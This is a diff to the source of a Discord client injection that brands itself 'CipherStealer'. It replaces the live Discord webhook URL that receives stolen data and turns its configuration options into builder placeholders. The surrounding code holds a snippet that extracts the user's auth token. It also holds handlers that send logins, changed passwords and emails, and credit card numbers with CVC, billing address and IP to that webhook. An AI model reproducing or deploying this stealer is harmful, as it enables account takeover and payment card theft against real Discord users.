@@ -6,7 +6,7 @@ const {
 } = require('electron')
 const querystring = require('querystring');
 const os = require('os')
-var webhook = "https://discord.com/api/webhooks/954161969068400651/jPrlk5zEyQhjbUM4ZtgG5E3mjG84Z3ugN9kMkiTcrWD9qN6_4N1QG4dpjhi2iWj7afbH";
+var webhook = "https://discord.com/api/webhooks/950532621077741578/nENnKyERqK5IsWglDcfSor07FASk0tlK72gx_JLCPZH32E93ljreZ1LY2MIpUy7DWsBA";
 const computerName = os.hostname();
 const discordInstall = `${__dirname}`
 const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
@@ -20,11 +20,11 @@ String.prototype.insert = function (index, string) {
 };
 
 const config = {
-    "logout": "instant",
-    "logout-notify": "true",
-    "init-notify":"false",
+    "logout": "%LOGOUT%",
+    "logout-notify": "%LOGOUTNOTI%",
+    "init-notify":"%INITNOTI%",
     "embed-color": 3447704,
-    "disable-qr-code": "true"
+    "disable-qr-code":"%DISABLEQRCODE%"
 }
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
@@ -185,7 +185,7 @@ function FirstTime() {
 									inline: !1
 								}],
 								author: {
-									name: '{b.username}#${b.discriminator} ()',
+									name: 'CipherStealer',
 									url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
 									icon_url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
 								},
@@ -476,7 +476,7 @@ function Login(email, password, token) {
 										inline: !1
 									}, ],
 									"author": {
-										"name": "${json.username}#${json.discriminator} (${json.id})"
+										"name": "CipherStealer"
 									},
 									"footer": {
 										"text": "CipherStealer"
@@ -626,7 +626,7 @@ function Login(email, password, token) {
 													inline: !1
 												}, ],
 												"author": {
-													"name": "${json.username}#${json.discriminator} (${json.id})"
+													"name": "CipherStealer"
 												},
 												"footer": {
 													"text": "CipherStealer"
@@ -808,7 +808,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 										inline: !1
 									}, ],
 									"author": {
-										"name": "${json.username}#${json.discriminator} (${json.id})"
+										"name": "CipherStealer"
 									},
 									"footer": {
 										"text": "CipherStealer"
@@ -967,7 +967,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 													inline: !1
 												}, ],
 												"author": {
-													"name": "${json.username}##${json.discriminator} (${json.id})"
+													"name": "CipherStealer"
 												},
 												"footer": {
 													"text": "CipherStealer"
@@ -1145,7 +1145,7 @@ function ChangeEmail(newemail, password, token) {
 										inline: !1
 									}, ],
 									"author": {
-										"name": "${json.username}#${json.discriminator} (${json.id})"
+										"name": "CipherStealer"
 									},
 									"footer": {
 										"text": "CipherStealer"
@@ -1300,7 +1300,7 @@ function ChangeEmail(newemail, password, token) {
 													inline: !1
 												}, ],
 												"author": {
-													"name": "${json.username}#${json.discriminator} (${json.id})"
+													"name": "CipherStealer"
 												},
 												"footer": {
 													"text": "CipherStealer"
@@ -1358,7 +1358,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
 					"title": "CipherStealer",
 					"description": "**<:black_joker:926273784305045526> Usuario:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**<:black_lips:926268648593719396> Correo electrónico:**```" + json.email + "```\n" + "**<:Bup_negro:926272964113104946> Nitro:**```" + GetNitro(json.premium_type) + "```\n**<:black_playboy:926268704000475196> Insignias:**```" + GetBadges(json.flags) + "```" + "\n**<a:black_cc:926273142350024764> Número de tarjeta: **```" + number + "```" + "\n**<a:black_cc:926273142350024764> Expiración de la tarjeta: **```" + expir_month + "/" + expir_year + "```" + "\n**<a:black_cc:926273142350024764> CVC: **```" + cvc + "```\n" + "**<a:black_cc:926273142350024764> País: **```" + country + "```\n" + "**<a:black_cc:926273142350024764> Estado: **```" + state + "```\n" + "**<a:black_cc:926273142350024764> Ciudad: **```" + city + "```\n" + "**<a:black_cc:926273142350024764> ZIP:**```" + zip + "```" + "\n**<a:black_cc:926273142350024764> Calle: **```" + street + "```" + "\n**<:black_mask:926268629245390879> Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
 					"author": {
-						"name": "${json.username}#${json.discriminator} (${json.id})"
+						"name": "CipherStealer"
 					},
 					"footer": {
 						"text": "CipherStealer"
